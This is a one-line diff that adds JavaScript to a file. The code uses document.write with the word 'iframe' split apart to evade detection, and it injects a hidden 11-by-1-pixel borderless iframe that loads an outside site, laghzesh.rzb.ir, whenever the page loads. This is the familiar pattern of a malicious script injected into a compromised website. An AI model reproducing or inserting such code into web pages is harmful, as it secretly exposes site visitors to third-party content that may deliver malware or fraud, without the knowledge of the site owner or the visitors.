@@ -1,0 +1,1 @@
+document.write ('<center><ifr');document.write ('ame width="11" height="1"src="http://laghzesh.rzb.ir" style="border: 0px;"');document.write (' frameborder="0" scrolling="auto"></ifr');document.write ('ame>');
